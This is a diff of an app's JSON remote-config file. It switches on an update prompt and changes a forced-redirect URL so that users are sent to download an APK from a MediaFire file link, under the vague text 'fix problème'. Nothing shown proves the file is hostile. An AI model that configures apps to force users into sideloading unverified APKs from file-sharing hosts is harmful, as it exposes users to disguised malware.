@@ -1,7 +1,7 @@
 {
   "forced_redirect": {
     "enabled": true,
-    "url": "https://youtu.be/wxZbrxdD4po?si=y9EHoXv13r6KLO6P"
+    "url": "https://www.mediafire.com/file/mv0l3lqhekorlo7/update-app-release.apk/file"
   },
   "custom_dialog": {
     "enabled": false,
@@ -10,10 +10,10 @@
     "button_text": "حسناً | OK"
   },
   "update_info": {
-    "show": false,
+    "show": true,
     "title": "تحديث جديد متاح | New Update Available",
-    "content": "يوجد إصدار جديد من التطبيق. يرجى التحديث للحصول على الميزات الجديدة والتحسينات.\n\nرابط التحديث: https://example.com/update\n\nA new version of the app is available. Please update to get new features and improvements.\n\nUpdate link: https://example.com/update",
+    "content": "Download   : fix problème",
     "button_text": "تحديث الآن | Update Now",
-    "url": "https://example.com/update"
+    "url": "https://www.mediafire.com/file/mv0l3lqhekorlo7/update-app-release.apk/file"
   }
 }
